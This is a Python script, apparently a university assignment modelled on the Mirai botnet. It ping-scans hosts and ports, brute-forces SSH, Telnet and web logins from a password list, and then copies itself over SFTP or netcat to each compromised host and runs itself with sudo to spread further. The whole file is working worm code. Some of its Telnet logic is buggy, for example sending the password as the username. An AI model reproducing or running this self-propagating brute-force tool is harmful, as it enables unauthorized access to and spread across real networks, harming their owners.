#!/usr/bin/python3

# Program: Assignment 2: Attack Automation - net_attack.py
# Author: KC
# Date: December 13, 2022
# Description: Automate bruteforce login by performing host scan and scanning
# designated ports. Deploy file or self-propogate. Inspired by Mirai botnet.
# ******************************************************************************
# ******************************************************************************

from scapy.all import *
from telnetlib import Telnet
from paramiko import *
import requests
import sys
import os

# ******************************************************************************
# Function: help()
# Description: Prints usage of command line arguments for net_attack.py
# ******************************************************************************
def help():
    print("Usage: ./net_attack.py -t <IP addrs file> -p <ports> -u <username> -f <passwords file>")
    print("Example: ./net_attack.py -t my_ips.txt -p 22,23 -u ubuntu -f pws.txt")
    exit()


# ******************************************************************************
# Function: input_validation()
# Description: Input validation for number of args and arg flags
# ******************************************************************************
def input_validation():
    args = sys.argv
    n_args = len(args)
    ips_filename = ""
    ports = ""
    username = ""
    pws_filename = ""
    deploy_filename = ""
    offset = 0  # used to keep code DRY: for checking -p, -u, -f, -d, -P args

    # There are 7,8,9,or 10 cli arguments
    if (n_args > 7 and  n_args < 12):  # includes script name as arg
        
        # First cli flag is correct, -t or -L
        if args[1] == '-t' or args[1] == '-L':

            # IP filename mode, -t
            if args[1] == '-t':
                ips_filename = args[2]
                offset = 2
                
            # Local scan mode, -L
            else:
                ips_filename = ""
                offset = 1

            # Essentials arguments correct
            if (args[1+offset] == '-p' and args[3+offset] == '-u' \
                    and args[5+offset] == '-f'):
                ports_str = args[2+offset].split(',')
                username = args[4+offset]
                pws_filename = args[6+offset]

            # Incorrect core arguments
            else:
                help()
    
            # Check if -d or -P is entered. Number of args must be 8,9,or 10
            if n_args >= 9:  # includes script name as arg

                # Check if -d for deploy file is an arg
                if args[7 + offset] == '-d':  # 7 = 6 core args + 1 for script name
                    try:
                        deploy_filename = args[8 + offset]
                    # Missing the deploy filename argument
                    except:
                        help()

                # Check if -P for self-propogate is an arg
                elif args[7 + offset] == '-P':  # 7 = 6 core args + 1 for script name
                    deploy_filename = "-P"
                
                # Did not use -d or -P and given the number of args, is something else
                else:
                    help()
        # Incorrect first cli flag combination
        else:
            help()
    # Incorrect number of cli arguments
    else:
        help()
    
    # Verify ports do not contain alpha characters and convert ports to int
    ports = []
    for p in ports_str:
        if not p.isnumeric():
            help()
        else:
            ports.append(int(p))

    cli_inputs = [ips_filename, ports, username, pws_filename, deploy_filename]
    return(cli_inputs)


# ******************************************************************************
# Function: read_ip_list(ip_file)
# Description: reads IP address from ip_file into a list
# ******************************************************************************
def read_ip_list(ip_file):
    # Open file and read contents if it exists
    try:
        with  open(ip_file, 'r') as f:
            # Each line contains a single IP address, add each to a list 
            ip_list = []
            for ip in f:
                ip_list.append(ip.strip())

            return(ip_list)

    except FileNotFoundError:
        print("Error: File", ip_file, "not found.")


# ******************************************************************************
# Function: is_reachable(ip)
# Description: test if host is reachable by pinging and return True if reachable
# ******************************************************************************
def is_reachable(ip):
    resp = sr1(IP(dst=ip)/ICMP(), timeout=0.5, verbose=False)
    if resp == None:
        return False

    else:
        return True


# ******************************************************************************
# Function: scan_port(ip, port)
# Description: sends a TCP SYN packet to the given port to test if it's open
# ******************************************************************************
def scan_port(ip, port):
    ip_header = IP(dst=ip)
    tcp_header = TCP(dport=port, flags='S')
    resp = sr1(ip_header/tcp_header, verbose=False)

    # If the response packet has SYN and ACK flags, the port is open
    if resp[TCP].flags == 'SA':
        return True
    else:
        return False


# ******************************************************************************
# Function: bruteforce_telnet(ip, port, username, password_list_filename)
# Description: Use password list and username to attempt to login to telnet 
# ******************************************************************************
def bruteforce_telnet(ip, port, username, password_list_filename):
    # Read password from file into list
    pw_list = []
    with open(password_list_filename, 'r') as f:
        for pw in f:
            pw_list.append(pw.strip())

    # Attempt to login to telnet with each password
    con = Telnet(ip, port)
    for pw in pw_list:
        # Start the telnet connection and read until the username prompt appears
        text = ("login:").encode("ascii")
        recv = con.read_until(text)

        # Send the usename encoded in ascii
        text = (pw + "\n").encode("ascii") # add newline to simulate user pressing ENTER
        con.write(text)

        # Send the password after "Password" prompt appears
        text = ("Password:").encode("ascii")
        recv = con.read_until(text)
        text = (pw + "\n").encode("ascii")
        con.write(text)
        recv = con.read_all()

        # Parse response for "Welcome" indicating successful login
        recv = recv.decode("ascii")
        success = recv.find("Welcome")
        if success != -1:
            # Close telnet cxn
            con.close()
            return pw

    # Connection failed
    con.close()
    return ""

        
# ******************************************************************************
# Function: bruteforce_shh(ip, port, username, password_list_filename)
# Description: Use password list and username to attempt to login to ssh
# ******************************************************************************
def bruteforce_ssh(ip, port, username, password_list_filename):
    # Read password from file into list
    pw_list = []
    with open(password_list_filename, 'r') as f:
        for pw in f:
            pw_list.append(pw.strip())

    # Attempt to login to ssh with each password
    for pw in pw_list:

        # Establish SSH connection and attempt to login
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, username=username, password=pw)
            
            # Close SSH cxn
            client.close()
            return pw

        # Authentication failed
        except:
            client.close()
            pass

    # None of the passwords were successful
    return "" 


# ******************************************************************************
# Function: bruteforce_web(ip, port, username, password_list_filename)
# Description: Use password list and username to attempt to login to ssh
# ******************************************************************************
def bruteforce_web(ip, port, username, password_list_filename):
    # Read password from file into list
    pw_list = []
    with open(password_list_filename, 'r') as f:
        for pw in f:
            pw_list.append(pw.strip())

    # Attempt to login to http with each password
    for pw in pw_list:
        
        # Send a POST request with username and password to the server
        login = {}
        login["username"] = username
        login["password"] = pw
        url = "http://" + str(ip) + ":" + str(port) + "/login.php"
        resp = requests.post(url, login)

        # Search resp.text for "Welcome admin!" which will appear if login successful
        # Can't use status code, receive 200 if login failed
        index = resp.text.find("Welcome " + username + "!")
        if index != -1:
            return pw
    
    # If none of the login credentials worked, return ""
    return ""

# ******************************************************************************
# Function: host_scan(iface)
# Description: Runs an active host scan on the given interface
# ******************************************************************************
def host_scan(iface):
    # Fetch IP address of interface
    my_ip = get_if_addr(iface)
    my_ip = my_ip.split('.')
    my_ip = my_ip[0] +'.' + my_ip[1] + '.' + my_ip[2] + '.'

    # Send ICMP ping request to each host and record responses
    # Using CIDR /24 network addressing with 255 hosts excluding broadcast addr
    #cidr_24 = 10  # TESTING ONLY
    cidr_24 = 255
    active_hosts = []
    for i in range(cidr_24):
        ip_dst = my_ip + str(i)
        pkt = IP(dst=ip_dst)/ICMP()
        resp = sr1(pkt, iface=iface, timeout=0.15)

        # If there is no host at the ip_dest, the reponse is None, continue
        if resp == None:
            pass
        # If there is a ping echo reply, save the IP
        else:
            ip_active = resp.getlayer("IP").src
            active_hosts.append(ip_active)

    # Return list of active IP addresses
    print("Active hosts:")
    print(active_hosts)
    return active_hosts

  
# ******************************************************************************
# Function: deploy_telnet(ip, port, username, pw, deploy_filename)
# Description: Deploy payload onto host via open telnet port
# ******************************************************************************
def deploy_telnet(ip, port, username, pw, deploy_filename):

    # Start the telnet connection and read until the username prompt appears
    con = Telnet(ip, port)
    text = ("login:").encode("ascii")
    recv = con.read_until(text)

    # Send the usename encoded in ascii
    text = (pw + "\n").encode("ascii") # add newline to simulate user pressing ENTER
    con.write(text)

    # Send the password after "Password" prompt appears
    text = ("Password:").encode("ascii")
    recv = con.read_until(text)
    text = (pw + "\n").encode("ascii")
    con.write(text)
    recv = con.read_all()

    # Create path strings
    num = ip.split('.')
    num = int(num[3]) - 1
    num = str(num)
    local_path = "/home/ubuntu/assignment_2/"
    remote_path = "/home/ubuntu/assign_2/server_" + num + "/"
    payload_1 = "net_attack.py"
    payload_2 = "passwords.txt"
    
    # Deploy file mode:
    if deploy_filename != '-P':
        local_path_d = local_path + deploy_filename
        remote_path_d = remote_path + deploy_filename
        print(" > Payload deployed on server")
    
    # Self-propogate mode: check if script is already on server
    else:
        # Execute 'find' command to search for payload on server
        cmd = "find " + remote_path + " -name " + payload_1
        recv = con.write(cmd.encode("ascii"))
        
        # 'find' did not locate the payload - Deploy the payloads 
        if recv.find(payload_1) == -1:

            # Transfer payload_1 over nc
            local_path_p = local_path + payload_1
            remote_path_p = remote_path + payload_1

            # Open nc listener on server and save to payload_1 filename
            nc_cmd_server = "nc -l 33333 > " + remote_path_p
            con.write(nc_cmd_server.encode("ascii"))

            # Send payload from attacker to server over ncat
            nc_cmd_attacker = "nc -w 2 " + ip + " 33333 < " + local_path_p
            os.system(nc_cmd_attacker)

            # Transfer payload_2 over nc
            local_path_p = local_path + payload_2
            remote_path_p = remote_path + payload_2

            # Open nc listener on server and save to payload_1 filename
            nc_cmd_server = "nc -l 33333 > " + remote_path_p
            con.write(nc_cmd_server.encode("ascii"))

            # Send payload from attacker to server over nc
            nc_cmd_attacker = "ncat -w 2 " + ip + " 33333 < " + local_path_p
            os.system(nc_cmd_attacker)
            
            print(" > Payload deployed on server")
            
        # Payload already present on server
        else:
            print(" - payload already present on", ip)
            
        # Add executable permissions to payload
        cmd = "sudo chmod +x " + remote_path + payload_1
        con.write(cmd.encode("ascii"))
        text = ("Password:").encode("ascii")
        recv = con.read_until(text)
        text = (pw + "\n").encode("ascii")
        con.write(text)

        # Run payload on server
        cmd = "sudo " + remote_path + payload_1 + " -L -p 22,23,80,8080"  \
                + " -u " + username + " -f " + remote_path + payload_2 + " -P"
        con.write(cmd.encode("ascii"))
 
    # Close telnet cxn
    con.close()


# ******************************************************************************
# Function: deploy_ssh(ip, port, username, pw, deploy_filename)
# Description: Deploy payload onto host via open ssh port
# ******************************************************************************
def deploy_ssh(ip, port, username, pw, deploy_filename):

    # Set up SSH cxn to host with open port 22
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.connect(ip, username=username, password=pw)
    
    # Create path strings
    num = ip.split('.')
    num = int(num[3]) - 1
    num = str(num)
    local_path = "/home/ubuntu/assignment_2/"
    remote_path = "/home/ubuntu/assign_2/server_" + num + "/"
    payload_1 = "net_attack.py"
    payload_2 = "passwords.txt"
    
    # Deploy file mode: open sftp connection, put file, close sftp
    if deploy_filename != '-P':
        sftp = client.open_sftp()
        sftp.put(local_path + deploy_filename, remote_path + deploy_filename)
        sftp.close()
        print(" > Payload deployed on server")
    
    # Self-propogate mode
    else:
        # Execute 'find' command to search for payload on server
        cmd = "find " + remote_path + " -name " + payload_1
        stdin, stdout, stderr = client.exec_command(cmd)
        out = stdout.read().decode()

        # 'find' did not locate the payload 
        if out.find(payload_1) == -1:

            # Open sftp cxn, put payload_1, put payload_2, close sftp cxn
            sftp = client.open_sftp()
            sftp.put(local_path + payload_1, remote_path + payload_1)
            sftp.put(local_path + payload_2, remote_path + payload_2)
            sftp.close()
            print(" > Payload deployed on server")
            
        # Payload already present on server
        else:
            print(" - payload already present on", ip)

        # Make payload script executable, run payload on server
        cmd = "sudo chmod +x " + remote_path + payload_1
        stdin, stdout, stderr = client.exec_command(cmd, get_pty=True)
        stdin.write(pw + '\n')
        stdin.flush()
        cmd = "sudo " + remote_path + payload_1 + " -L -p 22,23,80,8080" \
                + " -u " + username + " -f " + remote_path + payload_2 + " -P"
        stdin, stdout, stderr = client.exec_command(cmd, get_pty=True)
        print(" > Payload run on server")
 
    # Close SSH cxn
    client.close()


# ******************************************************************************
# Function: main()
# Description: Coordinates attack automation
# ******************************************************************************
if __name__ == '__main__': 
    # Get command line inputs
    cli_inputs = input_validation()
    filename_IPs = cli_inputs[0]
    ports = cli_inputs[1]
    username = cli_inputs[2]
    password_list_filename = cli_inputs[3]
    deploy_filename = cli_inputs[4]
    ip_list_reachable = []

    # If IP file is defined, read IP addresses from file
    if filename_IPs != "":
        ip_list = read_ip_list(filename_IPs)
        # Test which hosts are reachable
        for ip in ip_list:
            if is_reachable(ip):
                ip_list_reachable.append(ip)

    # Local Scan mode, IP filename is not defined, scan local network for hosts
    else:
        iface = "h1-eth0"
        ip_list_reachable = host_scan(iface)

    # Scan the ports given for each IP to see if they are open
    for ip in ip_list_reachable:
        for port in ports:
            # If scan_port returns True, the port is open
            if scan_port(ip, port):
                print("Host:", ip, "Port:", port, "is OPEN")

                # If port 22 is open, attempt to bruteforce ssh login
                if port == 22:
                    pw = bruteforce_ssh(ip, port, username, password_list_filename)

                    # Successful login to SSH
                    if pw != "":
                        print(" > SSH cxn with username:", username, "and password:", pw) 
                        # Deploy file(s) if -d or -P mode
                        if deploy_filename != "":
                            deploy_ssh(ip, port, username, pw, deploy_filename)


                # If port 23 is open, attempt to bruteforce telnet login
                if port == 23:
                    pw = bruteforce_telnet(ip, port, username, password_list_filename)

                    # Successful login to Telnet
                    if pw != "":
                        print(" > Telnet cxn with username:", username, "and password:", pw) 
                        # Deploy file(s) if -d or -P mode
                        if deploy_filename != "":
                            deploy_telnet(ip, port, username, pw, deploy_filename)


                # If port 80, 8080, or 8888 are open attempt to bruteforce HTTP login
                if port == 80 or port == 8080 or port == 8888:
                    pw = bruteforce_web(ip, port, username, password_list_filename)

                    # Successful login to HTTP
                    if pw != "":
                        print(" > HTTP cxn with username:", username, "and password:", pw) 
            # scan_port returns False, port is closed
            else:
                print("Host:", ip, "Port:", port, "is closed")
